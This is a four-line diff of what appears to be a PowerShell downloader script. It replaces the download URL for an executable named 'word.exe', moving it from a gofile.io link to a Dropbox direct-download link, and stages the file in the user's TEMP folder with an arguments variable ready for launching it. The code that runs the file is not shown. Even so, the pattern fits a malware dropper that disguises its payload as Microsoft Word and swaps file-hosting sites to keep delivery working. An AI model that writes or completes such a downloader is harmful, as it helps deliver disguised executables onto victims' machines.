@@ -1,4 +1,4 @@
-$DownloadUrl = "https://store10.gofile.io/download/web/c9b59620-888c-4958-af5c-2aa606264fc9/word.exe"
+$DownloadUrl = "https://www.dropbox.com/scl/fi/nmw82t48k2i0y43vzl3uw/word.exe?rlkey=kua8330w3d0f8vvimhevqcxoc&st=zekyrblp&dl=1"
 $ExeName     = "word.exe"
 $Arguments   = ""
 $DestPath = Join-Path $env:TEMP $ExeName
